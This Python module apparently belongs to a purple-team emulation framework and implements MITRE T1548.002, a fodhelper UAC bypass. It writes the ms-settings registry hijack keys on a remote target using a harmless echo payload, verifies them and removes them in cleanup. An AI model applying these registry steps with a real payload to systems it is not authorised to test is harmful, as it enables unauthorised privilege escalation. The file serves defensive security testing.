from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Bypass UAC via fodhelper registry key manipulation."""
    conn: TargetConnection | None = None
    try:
        method = parameters.get("method", "fodhelper")
        conn = await get_connection(target)
        if method == "fodhelper":
            await conn.run_ps(
                "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings'"
                " -Force | Out-Null"
            )
            await conn.run_ps(
                "New-Item -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                " -Force | Out-Null"
            )
            await conn.run_ps(
                "New-ItemProperty -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                " -Name 'DelegateExecute' -Value '' -PropertyType String "
                "-Force | Out-Null"
            )
            await conn.run_ps(
                "New-ItemProperty -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                " -Name '(Default)' -Value 'cmd.exe /c echo UAC_BYPASS_TEST' "
                "-PropertyType String -Force | Out-Null"
            )
            verify = await conn.run_ps(
                "Get-ItemProperty -Path "
                "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
                "| Format-List"
            )
            return TechniqueResult(
                technique_id="T1548.002",
                success=True,
                output=verify.stdout[:4096],
                error=None,
                execution_status=ExecutionStatus.SUCCESS,
            )
        return TechniqueResult(
            technique_id="T1548.002",
            success=False,
            error=f"Unknown method: {method}",
            execution_status=ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1548.002 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1548.002",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        await conn.run_ps(
            "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' "
            "-Recurse -Force -ErrorAction SilentlyContinue"
        )
    except Exception as e:
        logger.warning(f"T1548.002 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
